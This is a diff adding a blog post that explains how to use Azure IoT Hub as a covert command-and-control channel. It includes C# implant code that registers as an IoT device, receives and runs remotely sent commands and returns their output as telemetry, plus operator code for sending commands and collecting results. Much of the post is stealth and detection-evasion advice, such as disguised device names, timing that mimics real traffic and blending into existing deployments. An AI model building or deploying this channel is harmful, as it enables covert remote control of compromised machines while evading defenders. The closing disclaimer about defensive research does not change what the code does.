@@ -5,4 +5,309 @@ pubDate: 'Dec 20 2025'
 tags: ['azure', 'c2', 'offensive-security', 'iot']
 ---
 
-[Azure IoT Hub as C2 Infrastructure - Part 1](https://claude.ai/share/5a04f875-993c-4761-b35b-fdee22ada3a8)
+Traditional C2 infrastructure is noisy. HTTP beacons, DNS tunneling, and custom protocols scream "malware" to any decent EDR or network monitoring tool. But what if your command-and-control channel looked exactly like legitimate enterprise automation?
+
+**Azure IoT Hub** - Microsoft's managed service for IoT device communication - provides exactly that. It's designed for bidirectional messaging between cloud services and millions of devices. For red team operations, it's perfect: encrypted by default, uses standard HTTPS/MQTT, and blends seamlessly into enterprise Azure environments.
+
+**Result:** C2 traffic that looks like normal IoT device telemetry.
+
+## The Problem with Traditional C2
+
+Most C2 frameworks have telltale signatures:
+
+- **HTTP beacons:** Custom user agents, unusual timing patterns, POST-only endpoints
+- **DNS tunneling:** Excessive DNS queries, unusual subdomain patterns
+- **Custom protocols:** Non-standard ports, encrypted but suspicious payloads
+- **Cloud storage:** S3 buckets, Azure Blob containers with suspicious access patterns
+
+EDR solutions flag these immediately. Network monitoring detects anomalies. Even if encrypted, the *behavior* gives it away.
+
+## Why IoT Hub?
+
+Azure IoT Hub is Microsoft's enterprise-grade IoT messaging platform. It's designed for:
+
+- **Device-to-cloud telemetry:** Millions of devices sending sensor data
+- **Cloud-to-device commands:** Remote control and configuration updates
+- **Device management:** Firmware updates, device twins, job scheduling
+- **Built-in security:** TLS 1.2+, per-device authentication, Azure AD integration
+
+From a defensive perspective, IoT Hub traffic is:
+- ✅ Encrypted (TLS 1.2+)
+- ✅ Authenticated (SAS tokens or X.509 certificates)
+- ✅ Uses standard protocols (HTTPS, MQTT, AMQP)
+- ✅ Appears in legitimate Azure logs
+- ✅ Doesn't trigger network security alerts
+
+**The key insight:** If your C2 traffic looks like IoT device communication, it bypasses most detection mechanisms.
+
+## Architecture Overview
+
+The C2 architecture mirrors legitimate IoT patterns:
+
+```
+┌─────────────┐         ┌──────────────┐         ┌─────────────┐
+│   Implant   │◄───────►│  Azure IoT   │◄───────►│   Operator  │
+│  (Device)   │  MQTT   │     Hub      │  REST   │  (Backend)  │
+└─────────────┘         └──────────────┘         └─────────────┘
+     │                        │                        │
+     │                        │                        │
+  Device Twin            Message Routing          Azure Portal
+  (State Sync)           (Event Hubs)             (Management)
+```
+
+**Components:**
+
+1. **Implant (Device):** Registers as an IoT device, connects via MQTT/HTTPS
+2. **IoT Hub:** Manages device identity, routes messages, stores device state
+3. **Operator (Backend):** Sends commands via REST API, receives telemetry via Event Hubs
+
+## Device Registration
+
+First, we need to register our "device" with IoT Hub. This creates a device identity that can authenticate and communicate.
+
+```csharp
+using Microsoft.Azure.Devices;
+using Microsoft.Azure.Devices.Client;
+using Microsoft.Azure.Devices.Shared;
+
+public class IoTHubC2Client
+{
+    private readonly string _connectionString;
+    private readonly string _hubName;
+    private DeviceClient _deviceClient;
+    
+    public IoTHubC2Client(string hubConnectionString, string hubName)
+    {
+        _connectionString = hubConnectionString;
+        _hubName = hubName;
+    }
+    
+    public async Task<string> RegisterDeviceAsync(string deviceId)
+    {
+        var registryManager = RegistryManager.CreateFromConnectionString(_connectionString);
+        
+        // Check if device already exists
+        var existingDevice = await registryManager.GetDeviceAsync(deviceId);
+        if (existingDevice != null)
+        {
+            return existingDevice.Authentication.SymmetricKey.PrimaryKey;
+        }
+        
+        // Create new device identity
+        var device = new Device(deviceId)
+        {
+            Authentication = new AuthenticationMechanism
+            {
+                Type = AuthenticationType.Sas
+            }
+        };
+        
+        device = await registryManager.AddDeviceAsync(device);
+        
+        return device.Authentication.SymmetricKey.PrimaryKey;
+    }
+}
+```
+
+**Key points:**
+- Device ID can be anything (hostname, GUID, etc.)
+- SAS key authentication (symmetric key)
+- Device appears in Azure Portal as legitimate IoT device
+
+## Device Connection
+
+Once registered, the implant connects as a device client using the MQTT protocol:
+
+```csharp
+public async Task<bool> ConnectAsync(string deviceId, string deviceKey)
+{
+    var connectionString = $"HostName={_hubName}.azure-devices.net;DeviceId={deviceId};SharedAccessKey={deviceKey}";
+    
+    _deviceClient = DeviceClient.CreateFromConnectionString(
+        connectionString,
+        TransportType.Mqtt
+    );
+    
+    // Set up message handler for cloud-to-device commands
+    await _deviceClient.SetReceiveMessageHandlerAsync(HandleCommandMessage, null);
+    
+    // Set up desired property change handler (device twin updates)
+    await _deviceClient.SetDesiredPropertyUpdateCallbackAsync(HandleTwinUpdate, null);
+    
+    return _deviceClient.IsOpen;
+}
+
+private async Task<MessageResponse> HandleCommandMessage(Message message, object userContext)
+{
+    var commandPayload = Encoding.UTF8.GetString(message.GetBytes());
+    
+    // Process command (execute, download, upload, etc.)
+    var result = await ProcessCommand(commandPayload);
+    
+    // Send response back as telemetry
+    await SendTelemetryAsync(result);
+    
+    return MessageResponse.Completed;
+}
+```
+
+**Protocol choice:** MQTT over TLS is ideal because:
+- Lightweight (low bandwidth)
+- Bidirectional (device can receive commands)
+- Standard protocol (doesn't look suspicious)
+- Supports QoS levels (guaranteed delivery)
+
+## Sending Commands (Operator Side)
+
+The operator sends commands via the IoT Hub REST API or Service SDK:
+
+```csharp
+public async Task SendCommandAsync(string deviceId, string command, object payload)
+{
+    var serviceClient = ServiceClient.CreateFromConnectionString(_connectionString);
+    
+    var commandMessage = new Message(Encoding.UTF8.GetBytes(
+        JsonSerializer.Serialize(new { Command = command, Payload = payload })
+    ));
+    
+    commandMessage.MessageId = Guid.NewGuid().ToString();
+    commandMessage.ExpiryTimeUtc = DateTime.UtcNow.AddMinutes(5);
+    
+    await serviceClient.SendAsync(deviceId, commandMessage);
+}
+```
+
+**Command structure:**
+```json
+{
+  "Command": "execute",
+  "Payload": {
+    "Type": "powershell",
+    "Script": "Get-Process | Select-Object Name, CPU"
+  }
+}
+```
+
+## Receiving Telemetry (Operator Side)
+
+The operator receives implant responses via Event Hubs (IoT Hub's built-in message routing):
+
+```csharp
+public async Task StartTelemetryListenerAsync()
+{
+    var eventHubClient = EventHubClient.CreateFromConnectionString(
+        _eventHubConnectionString,
+        "messages/events"
+    );
+    
+    var runtimeInfo = await eventHubClient.GetRuntimeInformationAsync();
+    var partitions = runtimeInfo.PartitionIds;
+    
+    foreach (var partition in partitions)
+    {
+        var receiver = await eventHubClient.CreateReceiverAsync(
+            EventHubConsumerGroup.DefaultGroupName,
+            partition,
+            EventPosition.FromEnqueuedTime(DateTime.UtcNow)
+        );
+        
+        _ = Task.Run(async () =>
+        {
+            while (true)
+            {
+                var events = await receiver.ReceiveAsync(100, TimeSpan.FromSeconds(1));
+                if (events == null) continue;
+                
+                foreach (var eventData in events)
+                {
+                    var telemetry = JsonSerializer.Deserialize<TelemetryData>(
+                        Encoding.UTF8.GetString(eventData.Body.Array)
+                    );
+                    
+                    await ProcessTelemetry(telemetry);
+                }
+            }
+        });
+    }
+}
+```
+
+## Stealth Considerations
+
+**Device naming:** Use realistic device IDs
+- ❌ `C2-IMPLANT-001`
+- ✅ `WIN-PROD-SRV-01` or `DESKTOP-ABC123`
+
+**Message frequency:** Match legitimate IoT patterns
+- Telemetry every 30-60 seconds (not every second)
+- Burst patterns during "business hours"
+- Reduced activity during off-hours
+
+**Payload size:** Keep messages small
+- Commands: < 1KB
+- Responses: < 10KB (chunk larger data)
+
+**Device Twin properties:** Set realistic metadata
+```csharp
+var twin = new TwinCollection
+{
+    ["deviceModel"] = "Windows Server 2022",
+    ["firmwareVersion"] = "10.0.20348.1",
+    ["location"] = "Datacenter-01",
+    ["status"] = "online"
+};
+await _deviceClient.UpdateReportedPropertiesAsync(twin);
+```
+
+## Detection Evasion
+
+**What this bypasses:**
+- ✅ Network IDS/IPS (standard HTTPS/MQTT)
+- ✅ EDR network monitoring (legitimate Azure traffic)
+- ✅ Firewall rules (outbound HTTPS allowed)
+- ✅ DNS monitoring (uses Azure domains)
+- ✅ SSL inspection (legitimate Azure certificates)
+
+**What might still detect:**
+- ⚠️ Azure Monitor alerts (unusual device patterns)
+- ⚠️ IoT Hub metrics (message volume anomalies)
+- ⚠️ Device authentication logs (if monitored)
+- ⚠️ Cost alerts (unexpected IoT Hub usage)
+
+**Mitigation:** Use existing IoT Hub instances, blend with legitimate devices, keep message volume low.
+
+## Performance Characteristics
+
+| Metric | Value |
+|--------|-------|
+| **Connection latency** | 200-500ms (initial) |
+| **Command delivery** | < 1 second (MQTT QoS 1) |
+| **Telemetry delivery** | < 2 seconds (Event Hub) |
+| **Bandwidth per message** | ~500 bytes (command) |
+| **Concurrent devices** | Millions (IoT Hub scale) |
+
+**Cost:** IoT Hub Basic tier starts at $25/month for 8,000 messages/day. For C2 operations, this is negligible.
+
+## What's Next
+
+In **Part 2**, we'll cover:
+- Advanced command patterns (file transfer, persistence, lateral movement)
+- Device Twin synchronization (state management)
+- Multi-device orchestration (fleet management)
+- Error handling and retry logic
+- Operator console implementation
+
+In **Part 3**, we'll explore:
+- Detection evasion techniques
+- Blending with legitimate IoT deployments
+- Azure AD integration for authentication
+- Event Hub routing for stealth
+- Real-world deployment scenarios
+
+---
+
+**Disclaimer:** This research is for defensive security purposes and authorized red team operations only. Understanding adversary techniques helps build better defenses.
+
+**About:** nothing to see here.
+
+*Questions? Find me on [LinkedIn](https://linkedin.com/in/cbergin) or [GitHub](https://github.com/Calvindd2f).*
